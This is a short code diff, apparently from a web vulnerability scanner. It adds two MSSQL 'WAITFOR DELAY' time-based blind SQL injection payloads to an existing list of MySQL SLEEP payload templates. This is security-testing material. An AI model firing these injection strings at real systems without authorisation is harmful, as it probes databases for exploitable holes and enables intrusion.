@@ -62,7 +62,9 @@ SQL_INJECTION_BLIND_BASE=[
 "%20SLEEP({})",
 '%20or%20SLEEP({})',
 '''"or%20SLEEP({})%20or%20"*/''',
- '%2b(select*from(select(sleep({})))a)%2b'
+ '%2b(select*from(select(sleep({})))a)%2b',
+ ";WAITFOR DELAY '0:0:{}'--",
+" WAITFOR DELAY '0:0:{}'",
 ]
 REGEX_URL = {
 ".save":"\.save$",
